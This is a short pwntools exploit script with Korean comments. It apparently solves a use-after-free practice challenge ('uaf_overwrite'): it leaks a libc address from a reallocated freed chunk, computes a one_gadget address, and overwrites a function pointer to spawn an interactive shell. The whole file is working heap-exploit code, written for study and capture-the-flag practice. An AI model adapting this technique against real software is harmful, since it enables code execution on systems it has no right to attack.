from pwn import *

p = process("./uaf_overwrite")

e = ELF("./uaf_overwrite")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

libc_base = b''


og1 = 0xe3afe
og2 = 0xe3b01
og3 = 0xe3b04
offset = 0x1ecb42


# 첫 번째 할당!
p.sendlineafter("> ", str(3))
p.sendlineafter("Size: ", str(1280)) #1280 == 0x500
p.sendafter("Data: ", "AAAA")
p.sendlineafter("idx: ", str(10)) #free 안할거임 

# 두 번째 할당! (청크 병합 방지)
p.sendlineafter("> ", str(3))
p.sendlineafter("Size: ", str(1280))
p.sendafter("Data: ", "AAAA")
p.sendlineafter("idx: ", str(10))

# 세 번째 할당 (첫 번째 할당한 거 해제)
p.sendlineafter("> ", str(3))
p.sendlineafter("Size: ", str(1280))
p.sendafter("Data: ", "AAAA")
p.sendlineafter("idx: ", str(0))

# 네 번째 할당 (재할당) => libc에 mapping된 addr 읽기
p.sendlineafter("> ", str(3))
p.sendlineafter("Size: ", str(1280))
p.sendafter("Data: ", "B")

p.recvuntil("Data: ")
read = b'' + p.recvline()[:-1].ljust(8, b"\x00")
# print(u64(read))
# print(hex(u64(read)))

libc_base = (u64(read)) - offset
og = libc_base + og3

p.sendlineafter("idx: ", str(10))

# Human 함수 실행
p.sendlineafter("> ", str(1))
p.sendlineafter("Weight: ", str(47))
p.sendlineafter("Age: ", str(og))

# robot 함수 실행
p.sendlineafter("> ", str(2))
p.sendlineafter("Weight: ", "47")


# gdb.attach(p)

# pause()


p.interactive()
